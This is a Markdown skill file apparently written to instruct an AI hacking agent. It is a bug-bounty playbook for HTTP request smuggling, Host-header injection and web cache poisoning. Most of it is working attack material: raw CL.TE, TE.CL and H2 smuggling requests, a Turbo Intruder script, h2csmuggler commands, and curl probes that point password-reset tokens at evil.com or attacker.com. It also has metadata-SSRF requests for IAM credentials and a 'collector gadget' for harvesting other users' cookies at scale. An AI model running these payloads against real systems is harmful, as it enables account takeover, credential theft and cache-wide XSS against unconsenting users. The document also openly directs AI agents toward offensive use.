---
name: http-attacks
description: HTTP request smuggling — CL.TE/TE.CL/H2.TE/H2.CL variants, detection (timing-based, differential response), exploitation (bypassing front-end controls, capturing credentials, response queue poisoning, web cache poisoning, host header injection via smuggled request), and Turbo Intruder/h2csmuggler tooling.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP request smuggling exploits disagreements between front-end (load balancer/proxy) and back-end servers on where HTTP request bodies end. Modern variants include H2.TE and H2.CL (HTTP/2 downgrade). Base models often miss: (1) the confirmation step before exploitation, (2) H2 variants that bypass TE obfuscation defenses, (3) the response desync attack direction. Always confirm before attempting to poison.

## 0. RELATED ROUTING

- http2-specific-attacks — H2-specific techniques (single-packet race, h2c smuggling, header injection)
- web-cache-deception — combine smuggling with cache poisoning for wider impact
- auth — bypass authentication via smuggled requests

---

## 1. VULNERABILITY TYPES

| Type | Front-End Uses | Back-End Uses | Attack Vector |
|---|---|---|---|
| **CL.TE** | Content-Length | Transfer-Encoding | Smuggle via TE body |
| **TE.CL** | Transfer-Encoding | Content-Length | Smuggle via oversized CL |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding | Obfuscate TE header |
| **H2.TE** | HTTP/2 (no framing) | TE header | Inject TE in H2 headers |
| **H2.CL** | HTTP/2 (no framing) | Content-Length | Inject CL mismatch in H2 |
| **H2.0** | HTTP/2 | HTTP/1 (no length) | CRLF injection in h2 headers |

---

## 2. DETECTION (TIMING-BASED)

### CL.TE Timing Test

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

- **CL.TE vulnerable**: back-end waits for more data after `X` → **10+ second delay**
- Not vulnerable: responds normally

### TE.CL Timing Test

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

- **TE.CL vulnerable**: back-end waits for `X` byte from Content-Length → **10+ second delay**

> **Important**: Send these tests with `Connection: close` and disable request grouping in Burp.

---

## 3. CL.TE EXPLOITATION

Front-end uses Content-Length, back-end uses Transfer-Encoding.

### Basic Smuggle Structure

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggled&x=
0

GET /admin HTTP/1.1
Foo: x
```

The back-end sees two requests:
1. `POST /` with body `q=smuggled&x=`
2. `GET /admin HTTP/1.1` (smuggled)

### Bypass Front-End Access Control

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 112
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

x=hello
```

---

## 4. TE.CL EXPLOITATION

Front-end uses Transfer-Encoding, back-end uses Content-Length.

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

> **Note**: The chunk size `87` must equal the exact byte count of the smuggled request.

---

## 5. TE.TE (OBFUSCATION)

Both servers support TE, but one ignores obfuscated variants.

```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: [tab]chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

Send the attack as CL.TE or TE.CL depending on which server ignores the obfuscated form.

---

## 6. H2.TE / H2.CL (HTTP/2 DOWNGRADE)

When a front-end accepts HTTP/2 but back-end is HTTP/1.1.

### H2.TE Attack (Inject TE header into H2 request)

```
:method POST
:path /
:authority target.com
content-type application/x-www-form-urlencoded
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

smuggled=x
```

**Burp Suite**: Send in HTTP/2, insert `transfer-encoding: chunked` as a custom header in Inspector.

### H2.CL Attack (CL mismatch)

```
:method POST
:path /
:authority target.com
content-length 0

GET /admin HTTP/1.1
Host: target.com
```

---

## 7. CAPTURING OTHER USERS' REQUESTS

```http
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

comment=
```

The next victim's request is appended to the `comment=` parameter, capturing their session cookies/headers.

---

## 8. RESPONSE QUEUE POISONING (H2)

Cause two responses to be served to the wrong users.

```
Attack via H2.TE:
1. Smuggle a complete GET /admin request inside the body
2. First attacker response: normal 200 OK for POST /comment
3. Second attacker response: admin response (poison)
4. Next victim receives poisoned response meant for admin
```

---

## 9. CONFIRMING VULNERABILITY SAFELY

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 51
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: x
```

If the **next** normal response from anyone returns 404, the smuggle worked without causing harm.

---

## 10. TOOLING

### Burp Suite

```
1. Enable HTTP Request Smuggler extension
2. Smuggler > Scan for smuggling
3. Repeater: set "Duplicate Content-Length" for manual testing
4. Turn off Update Content-Length in HTTP tab
```

### Turbo Intruder (Python)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    
    smuggle = """POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 83\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: TARGET\r
Content-Length: 10\r
\r
smuggled="""
    
    engine.queue(smuggle, pauseTime=200)

def handleResponse(req, interesting):
    table.add(req)
```

### h2csmuggler

```bash
pip install h2csmuggler

# Scan for h2c upgrade vulnerability:
h2csmuggler --scan-list targets.txt

# Exploit:
h2csmuggler -x https://target.com \
  -d ':method: GET' \
  -d ':path: /admin' \
  -d ':scheme: https' \
  -d ':authority: target.com'
```

---

## 11. EXPLOITATION DECISION TREE

```
Identify entry point (CDN / load balancer / WAF proxy):
│
├── Does proxy support HTTP/2?
│   ├── Yes → Test H2.TE, H2.CL (most likely modern setup)
│   └── No → Test H1 variants (legacy infrastructure)
│
├── CL.TE timing test: 10s delay?
│   └── Yes → Test CL.TE exploitation path
│
├── TE.CL timing test: 10s delay?
│   └── Yes → Test TE.CL exploitation path
│
└── Both respond normally → Try TE.TE obfuscation variants

What to exploit:
├── Can access admin paths from front-end? → Bypass access control
├── Log body endpoint (comments, search)? → Capture other users' requests
├── Cache involved? → Response queue poison or cache poison
└── OAuth callback via HOST header? → Host header injection via smuggled request
```

## From hack-skills: Advanced Request Smuggling Techniques

### Client-Side Desync (Browser Fetch Pipelines)

**Scenario**: browser's `no-cors` fetch sends a request whose body bytes cause the origin to misparse boundaries — no front-proxy needed.

```javascript
// JavaScript PoC (browser + no-cors + credentials)
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**When this works**: server supports HTTP/1.1 keep-alive and has a CL/TE ambiguity reachable from browser fetch without a preflight (no custom headers, no JSON content-type). Success shows as side effects on other requests over the same connection.

### TE.TE — All 8 Obfuscation Variants

Both front and back support TE, but differ on which variant they accept as valid chunked:

```http
Transfer-Encoding: xchunked
```
```http
Transfer-Encoding : chunked
```
```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```
```http
Transfer-Encoding: x
```
```http
Transfer-Encoding:[TAB]chunked
```
(Replace [TAB] with real `\x09` byte.)
```http
 Transfer-Encoding: chunked
```
(One leading space before header name.)
```http
X: X
Transfer-Encoding: chunked
```
(Prior line value is `X`; lenient parsers may merge lines.)
```http
Transfer-Encoding
: chunked
```
(Field name and colon on separate physical lines; some parsers accept this.)

**Strategy**: for each (front, back) pair, determine which side accepts which variant as `chunked`. Map to equivalent CL.TE or TE.CL attack direction.

### H2 Downgrade — Pseudo-Header Injection

When edge accepts HTTP/2 but origin uses HTTP/1.1, inject TE header or CRLF-encoded request inside H2 header value:

```
Inject into H2 header value:
  header-name: ignored-value\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

If the H2→H1 translation layer writes header values verbatim, the CRLF sequence splits the reconstructed H1 stream at the origin — without any CL/TE header needed. Test: embed `\r\n\r\nGET /admin HTTP/1.1\r\nHost: target` inside a header value via Burp Inspector.

### CL.0 (Connection-Close Desync)

The origin terminates the connection after a 0-byte body is consumed via `Content-Length: 0`, but the front-end buffers the remaining bytes for the next request on the same connection:

```http
POST /keepalive HTTP/1.1
Host: target.example
Content-Length: 0
Connection: keep-alive

GET /admin HTTP/1.1
Host: target.example
```

No chunked encoding required. Works when front-end reuses connections but back-end closes on `Content-Length: 0`.

### Confirm Without Collateral

Safe confirmation probe — smuggle a request to a 404 path:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 51
Transfer-Encoding: chunked

0

GET /hopefully404 HTTP/1.1
Foo: x
```
If the **next** normal request returns 404, the smuggle worked. Never smuggle sensitive paths during confirmation.


---

## Hunt Methodology (Claude-BugHunter — real BB reports)

## 17. HTTP REQUEST SMUGGLING
> Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.

### CL.TE (Content-Length front, Transfer-Encoding back)
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Detection
```
1. Burp extension: HTTP Request Smuggler
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
```

### Impact Chain
```
Poison next request → access admin as victim
Steal credentials → capture victim's session
Cache poisoning → stored XSS at scale
```

---

## Target-Suitability Matrix (2026 reality check)

The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Modern proxies are RFC 9112 strict by default. Fingerprint the front-end BEFORE investing time.

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| **Nginx ≥ 1.21** | NO | NO | partial (H2 ingress) | partial | RFC-strict; rejects CL+TE with HTTP 400. Verified locally on Nginx 1.27 — all 9 documented variants killed by front-end ([docs/verification/phase2h-smuggling-cachepoison.md](../../docs/verification/phase2h-smuggling-cachepoison.md)). |
| **Caddy 2.x** | NO | NO | — | — | Hardened by default |
| **Envoy ≥ 1.20** | NO | NO | partial | partial | Hardened in most paths |
| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **Vulnerable**, see CVE-2021-40346 |
| **AWS ALB + specific upstream** | partial | partial | ✓ | ✓ | Several disclosed-paid reports 2022-2024 |
| **Cloudflare → S3 / Lambda chains** | — | — | ✓ | ✓ | H2-downgrade attacks remain viable |
| **Older F5 BIG-IP (TMM < 16)** | ✓ | — | — | — | Vendor advisories |
| **Citrix ADC / NetScaler (older firmware)** | ✓ | ✓ | — | — | Disclosed in 2020-2022 |
| **Squid 3.x** | ✓ | — | — | — | Older deployments |
| **Apache Traffic Server (older)** | ✓ | ✓ | ✓ | ✓ | PortSwigger research |
| **Apache mod_proxy_ajp → Tomcat** | — | — | — | — | Cross-protocol HTTP→AJP desync (CVE-2022-26377); smuggled request is opaque to the WAF and reaches internal AJP admin/status paths that lack the external auth controls |
| **Custom Python / Go proxies** | ✓ | ✓ | — | — | Frequently miss RFC enforcement |

### Operator fingerprint quick-check

```bash
curl -sI https://target/ | grep -i "Server:"
```

- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or look for legacy proxies upstream
- `HAProxy`, header points to AWS/CDN → run the full payload matrix
- No Server header → assume hardened, but run a single quick `space-before-colon` probe; if it doesn't 400, dig deeper

### H2.CL / H2.TE (the modern dominant vector)

H2-downgrade smuggling attacks rely on the front-end speaking HTTP/2 to the client and HTTP/1.1 to origin. The downgrade introduces CL/TE confusion because HTTP/2's frame-length headers don't survive the conversion cleanly. Most CDN+origin chains in 2024-2026 use this exact topology.

Tools that send HTTP/2 raw frames (Burp Pro's HTTP Request Smuggler extension, `h2csmuggler`, `smuggler.py`) are the right starting point against CDN-fronted targets. Avoid HTTP/1.1-only test clients (curl, raw sockets) against H2-front-ended targets — you'll send the wrong protocol entirely.

### Mass credential harvesting — the "collector gadget"
The highest-impact smuggling outcome needs no per-victim interaction. Instead of blindly poisoning the queue, smuggle a request aimed at a **back-end handler that echoes the full request** — a search endpoint that reflects headers, or a redirect that mirrors the request line. The next victim's headers (`Cookie`, `Authorization`, `X-Access-Token`) get attributed to your smuggled request, and the reflecting handler returns them **in a response you read**. Repeated on a busy keep-alive socket, this harvests live credentials from arbitrary users at scale — and it works even through a CDN (Akamai/Cloudflare) when the CDN↔origin hop desyncs. Chains to `hunt-ato`.

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Smuggling + cache is the canonical critical chain; one smuggled request becomes the cached response for every subsequent victim. Chain primitive: CL.TE smuggle a request whose response body contains attacker HTML/JS → front-end cache stores it under a popular URL (`/`, `/login`) → de-sync poisoning where the smuggled request becomes the cached response for the next N victims, persisting for the cache TTL.
- **`hunt-auth-bypass`** — Smuggling reaches internal-only routes that the front-end WAF/auth-proxy filters out. Chain primitive: smuggle `GET /admin/users HTTP/1.1` past the front-end ACL that blocks external `/admin/*` → backend processes the smuggled request as if from a trusted internal source → bypass front-end auth by smuggling internal-routed request → admin data in the response queue.
- **`hunt-idor`** — Smuggling attaches the NEXT user's session cookies to an attacker-controlled request path. Chain primitive: smuggle `GET /api/me HTTP/1.1` with no cookies → backend pairs it with the next legitimate user's incoming connection cookies → victim's session cookie attached to attacker's smuggled request → attacker reads the response containing victim's PII/tokens.
- **`hunt-xss`** — Smuggling injects XSS payloads into the response stream of the next victim without ever appearing in a URL parameter. Chain primitive: smuggled request body contains reflected payload that the backend renders into the next response in the queue → next visitor to `/` receives attacker HTML inline → reflected XSS at every visitor without any URL parameter visible to them or to logs.
- **`security-arsenal`** — Reach for the smuggling payload bank (CL.TE / TE.CL / TE.TE obfuscations, H2.CL downgrade probes, h2csmuggler one-liners, Burp HTTP Request Smuggler extension config) and the time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the smuggled-request effect MUST land on a request issued by a different client/session, not your own follow-up. A timing delta in your own browser alone is parser disagreement, not exploitable smuggling.






---

## host-header

# HUNT-HOST-HEADER — Host Header Injection

## Grounding / Provenance

This skill is built from the public Host-header attack literature, not invented payloads.
Cite the *technique source* in your report, never a fabricated ID:

- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
  "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
  case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
  allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
  James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
  These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
- **Routing-based SSRF** — PortSwigger Research, "Cracking the lens" / routing-based SSRF
  (Host header steers the front-end's upstream selection).

When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT
on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not
verified — a missing citation is always better than a wrong one.

---

## Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).

**Highest-value chains:**
- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
  token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
  their own reset leaks the token to evil.com.
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
  an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
  entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
  → cloud metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
  `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

---

## Attack Surface Signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)
```

**Dangerous header candidates (unkeyed / trusted inputs):**
```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
```

---

## Step-by-Step Hunting Methodology

> Always test against **your own** registered test account. Never request another user's reset.

### Phase 1 — Password Reset Poisoning

```bash
# 1a. Override Host directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.com"}'

# 1b. X-Forwarded-Host (behind reverse proxy that trusts it)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1c. Host + X-Forwarded-Host combo, and X-Host
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null

# 1e. Absolute-URL injection: keep real Host, append attacker host so the
#     reset link becomes https://TARGET.evil.com/... or routes the token out
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"

# 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
```

**Confirm:** open the reset email *in your own test inbox* and read the link host. The token must
appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
have proof — see Validation.

### Phase 2 — Web Cache Poisoning via Host / X-Forwarded-Host

Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not
control**. No Collaborator callback is expected from the cache test itself — only later, if a
victim's browser loads the poisoned absolute URL.

```bash
# 2a. Is the host reflected into the body?
curl -s https://$TARGET/ \
  -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" \
  | grep -i "canary"

# 2b. Is the response cacheable, and what is the cache key?
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"
#   Look for: X-Cache/CF-Cache-Status: HIT, nonzero Age, Via: varnish/fastly/cloudfront.
#   Check Vary: — if Vary does NOT include X-Forwarded-Host, the header is UNKEYED → poisonable.

# 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on same key.
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # poison
curl -s "$URL" | grep -i "evilcdn.example"                        # clean victim view → reflected = POISONED
```

**False-positive killers (mandatory):**
- A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in
  `Vary`, or the CDN includes Host in the key) is **not** poisoning — confirm 2c returns the
  payload on a request that *omits* the header.
- `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
- Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming
  "mass". Cache scope is often per-edge / per-cookie / per-geo.

### Phase 3 — SSRF via Host Header — TWO DISTINCT MECHANISMS (do not conflate)

These operate at different layers. Test them separately; they do **not** compose into one request.

**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the
**request line**, exactly as a normal request, because the metadata service / internal host serves
plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant
here — the EC2 IMDS ignores it.

```bash
# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP / Azure equivalents (still routing via Host):
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# Internal hostname / port routing:
curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# Blind / no reflection? Point the Host at a Collaborator subdomain and watch for the
# proxy's outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** This is an
IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host
stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.

```bash
# Reach an internal/blocked path the edge thought it denied. Real Host stays.
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"
# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
```

> The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
> two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.

### Phase 4 — OAuth / OIDC / SAML Poisoning

```bash
# Does the authorization endpoint build redirect_uri / display URL from Host?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="

# OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

**Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
Collaborator) — a reflected string alone is not ATO.

### Phase 5 — Header Fuzzing (Param Miner)

Burp **Param Miner → Guess headers** is faster and finds unkeyed/cache-affecting headers the list
below misses. Manual sweep:

```bash
HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HOST_HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

---

## Validation (house discipline)

✅ **Password reset:** the token URL in **your own test account's email** uses an
attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound
HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
`MISS`/`Age:0` only.
✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
DNS/HTTP hit on your Collaborator from the front-end (blind case).
✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
not merely reflected.

**Always rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
  target or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
  HTTP response does not guarantee a poisoned *email*; verify the email body.

**Severity:**
- Reset → ATO for any user: Critical
- Routing SSRF → cloud metadata creds: Critical (if creds usable) / High
- Cache poisoning → mass XSS/redirect (shared key proven): High
- Path-override → internal/admin reach: High
- Reflected only, uncacheable, not in email, no internal reach: Low / informational




---

## cache-poison

## Crown Jewel Targets

Cache poisoning is high-value because a single poisoned cache entry can affect thousands or millions of victims simultaneously — one request, mass exploitation. Payout scales with blast radius.

**Highest-value targets:**
- **CDN-served assets** (cdn.shopify.com, cloudfront distributions, Fastly/Akamai edges) — poisoning these affects every visitor globally
- **E-commerce platforms** with affiliate/referral flows (Shopify, WooCommerce storefronts) — session hijack or affiliate fraud potential
- **Gaming platforms with update servers** (rockstargames updates.* domains) — DoS on update delivery = widespread client breakage
- **Authentication endpoints** served through caches — leads to account takeover (the highest severity variant)
- **Asset CDNs** (JS/CSS delivery) — XSS payload delivery at scale
- **SaaS multi-tenant platforms** — one poisoned response bleeds into all tenants sharing a cache key

**Asset types that pay most:** CDN hostnames, subdomain-per-tenant patterns, update/download servers, login/account pages cached incorrectly, affiliate link shorteners.

---

## Autonomous Testing Priority

**Two distinct attacks live under this skill — target the simpler one first.**

**Attack 1 — Password Reset Poisoning (Host header injection):**

The app uses the `Host` header to construct the password reset link in the email. Inject an attacker-controlled hostname; the victim's reset email contains a link to your server.

```
POST /forgot-password
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com

email=victim@target.com
Content-Type: application/x-www-form-urlencoded
```

Use a distinctive hostname you control or can identify in the response. **Proof:** the injected hostname appears in the response body (some apps reflect the generated reset link), or the action succeeds (2xx with a "reset email sent" message) after injection — confirming the poisoned link would be sent to the victim.

Try multiple host headers — apps vary in which one they trust (`X-Forwarded-Host` is most common, but `Host` itself also works when the proxy passes it through).

**Attack 2 — Web Cache Poisoning:**

Inject the attacker-controlled hostname into `X-Forwarded-Host` on a GET request for a cacheable page. If the hostname is reflected in the response body AND the response gets cached, subsequent visitors receive the poisoned response.

Check for cache signals in the response: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: <nonzero>`, or `Via: cloudfront/varnish/fastly`.

**Proof for both:** injected value reflected in response body, or action completed successfully despite the manipulated header.

---

## Attack Surface Signals

**URL patterns to look for:**
- `cdn.`, `assets.`, `static.`, `updates.`, `downloads.` subdomains
- URL path structures with extensions that look static: `/path/to/page.css`, `/account.php/nonexistent.jpg`
- Affiliate/link shortener endpoints: `/link/`, `/go/`, `/ref/`, `/out/`
- Paths that mix dynamic content with cacheable-looking URLs

**Response headers that signal a cache:**
```
X-Cache: HIT / MISS
X-Cache-Status: HIT
CF-Cache-Status: HIT / MISS (Cloudflare)
Age: <nonzero>
Via: 1.1 varnish / cloudfront / fastly
Cache-Control: public, max-age=...
Surrogate-Control: max-age=...
X-Served-By: cache-...
```

**JS/tech stack signals:**
- Fastly, Varnish, Cloudfront, Akamai, Nginx proxy_cache in response headers
- Shopify/Linkpop stacks with third-party integrations
- Platforms using path-based routing without normalizing trailing segments
- Servers that reflect unvalidated headers into responses (Host, X-Forwarded-Host, X-Original-URL)

**Dangerous header candidates (unkeyed inputs):**
```
X-Forwarded-Host
X-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Forwarded
X-HTTP-Method-Override
```

---

## Step-by-Step Hunting Methodology

1. **Map cache infrastructure.** Send a GET to the target and inspect response headers. Identify the caching layer (Cloudflare, Fastly, Varnish, Nginx). Note `Age`, `X-Cache`, `CF-Cache-Status` headers.

2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).

3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)

4. **Test URL path manipulation (Web Cache Deception).** Append fake static extensions to dynamic endpoints:
   - `GET /account/profile.css`
   - `GET /dashboard/settings.jpg`
   - `GET /affiliate-link/target.js`
   Check if the server returns dynamic content AND the cache stores it.

5. **Test for DoS via cache poisoning.** Send a request with a header that causes a 4xx/5xx error and check if that error response gets cached:
   - Malformed `Host` header
   - `X-Forwarded-Host` pointing to an invalid host
